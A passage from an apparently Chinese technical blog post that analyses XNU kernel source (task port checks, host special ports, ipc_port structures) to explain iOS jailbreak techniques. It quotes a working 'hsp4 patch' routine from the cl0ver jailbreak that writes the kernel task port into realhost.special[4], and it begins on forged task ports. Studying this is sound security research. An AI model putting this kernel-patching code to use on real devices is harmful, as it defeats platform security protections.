class="type">task_t</span>		task = TASK_NULL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (IP_VALID(port)) &#123;</span><br><span class="line">		ip_lock(port);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (	ip_active(port)					&amp;&amp;</span><br><span class="line">				ip_kotype(port) == IKOT_TASK		) &#123;</span><br><span class="line">			<span class="type">task_t</span> ct = current_task();</span><br><span class="line">			task = (<span class="type">task_t</span>)port-&gt;ip_kobject;</span><br><span class="line">			assert(task != TASK_NULL);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (task_conversion_eval(ct, task)) &#123;</span><br><span class="line">				ip_unlock(port);</span><br><span class="line">				<span class="keyword">return</span> TASK_NULL;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (exec_token) &#123;</span><br><span class="line">				*exec_token = task-&gt;exec_token;</span><br><span class="line">			&#125;</span><br><span class="line">			task_reference_internal(task);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ip_unlock(port);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (task);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>检查就在<code>task_conversion_eval()</code>函数中，caller是想要操作任务端口的任务，victim是被操作的任务。首先检查caller是否为内核，如果是则返回成功。然后检查caller是否与victim相同，因为任务应该能够对其自身执行操作。第三次检查就是关键的地方了，如果想要操作kernel_task而自己不是kernel_task，则检查不会通过。不过这只是对kernel_task指针进行检查实现的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">task_conversion_eval</span><span class="params">(<span class="type">task_t</span> caller, <span class="type">task_t</span> victim)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Tasks are allowed to resolve their own task ports, and the kernel is</span></span><br><span class="line"><span class="comment">	 * allowed to resolve anyone&#x27;s task port.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (caller == kernel_task) &#123;</span><br><span class="line">		<span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (caller == victim) &#123;</span><br><span class="line">		<span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Only the kernel can can resolve the kernel&#x27;s task port. We&#x27;ve established</span></span><br><span class="line"><span class="comment">	 * by this point that the caller is not kernel_task.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (victim == TASK_NULL || victim == kernel_task) &#123;</span><br><span class="line">		<span class="keyword">return</span> KERN_INVALID_SECURITY;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> CONFIG_EMBEDDED</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * On embedded platforms, only a platform binary can resolve the task port</span></span><br><span class="line"><span class="comment">	 * of another platform binary.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((victim-&gt;t_flags &amp; TF_PLATFORM) &amp;&amp; !(caller-&gt;t_flags &amp; TF_PLATFORM)) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SECURE_KERNEL</span></span><br><span class="line">		<span class="keyword">return</span> KERN_INVALID_SECURITY;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">		<span class="keyword">if</span> (cs_relax_platform_task_ports) &#123;</span><br><span class="line">			<span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> KERN_INVALID_SECURITY;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* SECURE_KERNEL */</span></span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_EMBEDDED */</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此尽管能够得到内核任务，但是仍将无法在其上调用Mach API，因为这里会返回<code>KERN_INVALID_SECURITY</code>，从而之前的函数将返回<code>TASK_NULL</code>。</p>
<blockquote>
<p>在嵌入式平台上，代码会检查代码签名中的<code>TF_PLATFORM</code>标志，它是<code>platform-application entitlement</code>，这意味着没有此entitlement的caller无法对拥有这项entitlement的victim执行操作(只有Apple的文件才有这个entitlement)。</p>
</blockquote>
<p>因此，较新的技术之一就是使用<code>host_get_special_port()</code>函数，来看看<code>osfmk/mach/host_special_ports.h</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Cannot be set or gotten from user space</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_SECURITY_PORT               0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_MIN_SPECIAL_PORT            HOST_SECURITY_PORT</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Always provided by kernel (cannot be set from user-space).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_PORT                        1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_PRIV_PORT                   2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_IO_MASTER_PORT              3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_MAX_SPECIAL_KERNEL_PORT     7 <span class="comment">/* room to grow */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_LAST_SPECIAL_KERNEL_PORT    HOST_IO_MASTER_PORT</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Not provided by kernel</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_DYNAMIC_PAGER_PORT         (1 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_AUDIT_CONTROL_PORT         (2 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_USER_NOTIFICATION_PORT     (3 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_AUTOMOUNTD_PORT            (4 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_LOCKD_PORT                 (5 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_KTRACE_BACKGROUND_PORT     (6 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_SEATBELT_PORT              (7 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_KEXTD_PORT                 (8 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_LAUNCHCTL_PORT             (9 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_UNFREED_PORT		(10 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_AMFID_PORT			(11 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_GSSD_PORT			(12 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_TELEMETRY_PORT		(13 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_ATM_NOTIFICATION_PORT	(14 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_COALITION_PORT		(15 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_SYSDIAGNOSE_PORT           (16 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_XPC_EXCEPTION_PORT		(17 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_CONTAINERD_PORT		(18 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_NODE_PORT			(19 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_RESOURCE_NOTIFY_PORT	(20 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_CLOSURED_PORT		(21 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_SYSPOLICYD_PORT		(22 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_MAX_SPECIAL_PORT		HOST_SYSPOLICYD_PORT</span></span><br><span class="line">                                        <span class="comment">/* MAX = last since rdar://35861175 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* obsolete name */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_CHUD_PORT HOST_LAUNCHCTL_PORT</span></span><br></pre></td></tr></table></figure>

<p>从注释中可以看出前七个端口是为内核本身保留的。但是到目前为止，仅使用了其中的三个。HOST_PORT提供了主机的抽象，HOST_PRIV用于特权操作，而HOST_IO_MASTER_PORT用于与设备进行交互。每个特殊端口都有特定的编号，这非常重要。我们可以注意到没有使用编号4。</p>
<p>此外，为了获得发送到主机特殊端口的权限需要使用一个int参数调用<code>host_get_special_port</code>，该参数是分配给该特殊端口的编号。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *      User interface for setting a special port.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *      Only permits the user to set a user-owned special port</span></span><br><span class="line"><span class="comment"> *      ID, rejecting a kernel-owned special port ID.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *      A special kernel port cannot be set up using this</span></span><br><span class="line"><span class="comment"> *      routine; use kernel_set_special_port() instead.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">host_set_special_port</span><span class="params">(<span class="type">host_priv_t</span> host_priv, <span class="type">int</span> id, <span class="type">ipc_port_t</span> port)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (host_priv == HOST_PRIV_NULL || id &lt;= HOST_MAX_SPECIAL_KERNEL_PORT || id &gt; HOST_MAX_SPECIAL_PORT)</span><br><span class="line">		<span class="keyword">return</span> (KERN_INVALID_ARGUMENT);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> CONFIG_MACF</span></span><br><span class="line">	<span class="keyword">if</span> (mac_task_check_set_host_special_port(current_task(), id, port) != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> (KERN_NO_ACCESS);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (kernel_set_special_port(host_priv, id, port));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *      User interface for retrieving a special port.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *      Note that there is nothing to prevent a user special</span></span><br><span class="line"><span class="comment"> *      port from disappearing after it has been discovered by</span></span><br><span class="line"><span class="comment"> *      the caller; thus, using a special port can always result</span></span><br><span class="line"><span class="comment"> *      in a &quot;port not valid&quot; error.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">host_get_special_port</span><span class="params">(<span class="type">host_priv_t</span> host_priv, __unused <span class="type">int</span> node, <span class="type">int</span> id, <span class="type">ipc_port_t</span> * portp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">ipc_port_t</span> port;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (host_priv == HOST_PRIV_NULL || id == HOST_SECURITY_PORT || id &gt; HOST_MAX_SPECIAL_PORT || id &lt; HOST_MIN_SPECIAL_PORT)</span><br><span class="line">		<span class="keyword">return</span> (KERN_INVALID_ARGUMENT);</span><br><span class="line"></span><br><span class="line">	host_lock(host_priv);</span><br><span class="line">	port = realhost.special[id];</span><br><span class="line">	*portp = ipc_port_copy_send(port);</span><br><span class="line">	host_unlock(host_priv);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (KERN_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看该函数，我们可以看到它需要host_priv端口作为参数，因此除了满足所有沙盒检查之外，执行此调用还需要root权限。<code>host_get_special_port</code>函数从<code>realhost.special[id]</code>得到端口值并返回给调用者。<br>回到指针检查，如果我们可以重新映射内核任务，将其写入未使用的端口空间，即<code>realhost.special[4]</code>，然后调用<code>host_get_special_port(4)</code>，这应该就可以得到可用的内核任务。</p>
<p>该技术也称为hsp4 patch，广泛用于最近的一些越狱中，<a target="_blank" rel="noopener" href="https://twitter.com/Siguza">Siguza</a>编写的cl0ver中的利用代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">patch_host_special_port_4</span><span class="params">(<span class="type">task_t</span> kernel_task)</span></span><br><span class="line">&#123;</span><br><span class="line">    DEBUG(<span class="string">&quot;Installing host_special_port(4) patch...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">addr_t</span> *special = (<span class="type">addr_t</span>*)offsets.slid.data_realhost_special;</span><br><span class="line">    <span class="type">vm_address_t</span> kernel_task_addr,</span><br><span class="line">                 kernel_self_port_addr,</span><br><span class="line">                 old_port_addr;</span><br><span class="line">    <span class="type">vm_size_t</span> size;</span><br><span class="line">    <span class="type">kern_return_t</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get address of kernel task</span></span><br><span class="line">    size = <span class="keyword">sizeof</span>(kernel_task_addr);</span><br><span class="line">    ret = vm_read_overwrite(kernel_task, (<span class="type">vm_address_t</span>)offsets.slid.data_kernel_task, <span class="keyword">sizeof</span>(kernel_task_addr), (<span class="type">vm_address_t</span>)&amp;kernel_task_addr, &amp;size);</span><br><span class="line">    <span class="keyword">if</span>(ret != KERN_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        THROW(<span class="string">&quot;Failed to get kernel task address: %s&quot;</span>, mach_error_string(ret));</span><br><span class="line">    &#125;</span><br><span class="line">    DEBUG(<span class="string">&quot;Kernel task address: &quot;</span> ADDR, (<span class="type">addr_t</span>)kernel_task_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get address of kernel task/self port</span></span><br><span class="line">    size = <span class="keyword">sizeof</span>(kernel_self_port_addr);</span><br><span class="line">    ret = vm_read_overwrite(kernel_task, kernel_task_addr + offsets.unslid.off_task_itk_self, <span class="keyword">sizeof</span>(kernel_self_port_addr), (<span class="type">vm_address_t</span>)&amp;kernel_self_port_addr, &amp;size);</span><br><span class="line">    <span class="keyword">if</span>(ret != KERN_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        THROW(<span class="string">&quot;Failed to get kernel task port address: %s&quot;</span>, mach_error_string(ret));</span><br><span class="line">    &#125;</span><br><span class="line">    DEBUG(<span class="string">&quot;Kernel task port address: &quot;</span> ADDR, (<span class="type">addr_t</span>)kernel_self_port_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check if realhost.special[4] is set already</span></span><br><span class="line">    size = <span class="keyword">sizeof</span>(old_port_addr);</span><br><span class="line">    ret = vm_read_overwrite(kernel_task, (<span class="type">vm_address_t</span>)(&amp;special[<span class="number">4</span>]), <span class="keyword">sizeof</span>(old_port_addr), (<span class="type">vm_address_t</span>)&amp;old_port_addr, &amp;size);</span><br><span class="line">    <span class="keyword">if</span>(ret != KERN_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        THROW(<span class="string">&quot;Failed to read realhost.special[4]: %s&quot;</span>, mach_error_string(ret));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(old_port_addr != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(old_port_addr == kernel_self_port_addr)</span><br><span class="line">        &#123;</span><br><span class="line">            DEBUG(<span class="string">&quot;Patch already in place, nothing to do&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            THROW(<span class="string">&quot;realhost.special[4] has a valid port already&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write to realhost.special[4]</span></span><br><span class="line">    ret = vm_write(kernel_task, (<span class="type">vm_address_t</span>)(&amp;special[<span class="number">4</span>]), (<span class="type">vm_address_t</span>)&amp;kernel_self_port_addr, <span class="keyword">sizeof</span>(kernel_self_port_addr));</span><br><span class="line">    <span class="keyword">if</span>(ret != KERN_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        THROW(<span class="string">&quot;Failed to patch realhost.special[4]: %s&quot;</span>, mach_error_string(ret));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DEBUG(<span class="string">&quot;Successfully installed patch&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="伪造任务端口"><a href="#伪造任务端口" class="headerlink" title="伪造任务端口"></a>伪造任务端口</h3><p>最近常见的越狱技术之一是使用伪造的端口。内核以为是端口，但是实际是用户控制的内存空间。然后使用某些API可以从内核中提取数据。<code>osfmk/ipc/ipc_port.h中定义</code>的端口结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_port</span> &#123;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Initial sub-structure in common with ipc_pset</span></span><br><span class="line"><span class="comment">	 * First element is an ipc_object second is a</span></span><br><span class="line"><span class="comment">	 * message queue</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_object</span> <span class="title">ip_object</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_mqueue</span> <span class="title">ip_messages</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">ipc_space</span> *<span class="title">receiver</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">ipc_port</span> *<span class="title">destination</span>;</span></span><br><span class="line">		<span class="type">ipc_port_timestamp_t</span> timestamp;</span><br><span class="line">	&#125; data;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">ipc_kobject_t</span> kobject;</span><br><span class="line">		<span class="type">ipc_importance_task_t</span> imp_task;</span><br><span class="line">		<span class="type">ipc_port_t</span> sync_inheritor_port;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">knote</span> *<span class="title">sync_inheritor_knote</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">turnstile</span> *<span class="title">sync_inheritor_ts</span>;</span></span><br><span class="line">	&#125; kdata;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_port</span> *<span class="title">ip_nsrequest</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_port</span> *<span class="title">ip_pdrequest</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_port_request</span> *<span class="title">ip_requests</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">ipc_kmsg</span> *<span class="title">premsg</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">turnstile</span> *<span class="title">send_turnstile</span>;</span></span><br><span class="line">		SLIST_ENTRY(ipc_port) dealloc_elm;</span><br><span class="line">	&#125; kdata2;</span><br></pre></td></tr></table></figure>

<p>第一个成员是<code>ipc_object</code>，可以在<code>osfmk/ipc/ipc_object.h</code>中找到其定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The ipc_object is used to both tag and reference count these two data</span></span><br><span class="line"><span class="comment"> * structures, and (Noto Bene!) pointers to either of these or the</span></span><br><span class="line"><span class="comment"> * ipc_object at the head of these are freely cast back and forth; hence</span></span><br><span class="line"><span class="comment"> * the ipc_object MUST BE FIRST in the ipc_common_data.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * If the RPC implementation enabled user-mode code to use kernel-level</span></span><br><span class="line"><span class="comment"> * data structures (as ours used to), this peculiar structuring would</span></span><br><span class="line"><span class="comment"> * avoid having anything in user code depend on the kernel configuration</span></span><br><span class="line"><span class="comment"> * (with which lock size varies).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_object</span> &#123;</span></span><br><span class="line">	<span class="type">ipc_object_bits_t</span> io_bits;</span><br><span class="line">	<span class="type">ipc_object_refs_t</span> io_references;</span><br><span class="line">	<span class="type">lck_spin_t</span>	io_lock_data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>ipc_object</code>的第一个成员<code>io_bits</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	IPC steals the high-order bits from the kotype to use</span></span><br><span class="line"><span class="comment"> *	for its own purposes.  This allows IPC to record facts</span></span><br><span class="line"><span class="comment"> *	about ports that aren&#x27;t otherwise obvious from the</span></span><br><span class="line"><span class="comment"> *	existing port fields.  In particular, IPC can optionally</span></span><br><span class="line"><span class="comment"> *	mark a port for no more senders detection.  Any change</span></span><br><span class="line"><span class="comment"> *	to IO_BITS_PORT_INFO must be coordinated with bitfield</span></span><br><span class="line"><span class="comment"> *	definitions in 